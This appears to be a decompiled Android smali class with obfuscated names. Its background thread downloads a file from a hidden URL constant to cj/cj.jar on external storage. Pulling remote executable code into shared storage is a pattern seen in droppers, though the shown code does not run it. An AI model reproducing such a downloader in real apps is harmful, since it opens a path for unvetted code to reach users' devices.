.class final Lcom/example/tb/b;
.super Ljava/lang/Thread;


# instance fields
.field private final synthetic t:Landroid/os/Handler;


# direct methods
.method constructor <init>(Landroid/os/Handler;)V
    .locals 0

    iput-object p1, p0, Lcom/example/tb/b;->t:Landroid/os/Handler;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 4

    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/cj/cj.jar"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/example/tb/HttpUtil;->getInstance()Lcom/example/tb/HttpUtil;

    move-result-object v1

    sget-object v2, Lcom/example/tb/Constants;->l:Ljava/lang/String;

    iget-object v3, p0, Lcom/example/tb/b;->t:Landroid/os/Handler;

    invoke-virtual {v1, v2, v0, v3}, Lcom/example/tb/HttpUtil;->doDLFile(Ljava/lang/String;Ljava/io/File;Landroid/os/Handler;)Z

    return-void
.end method
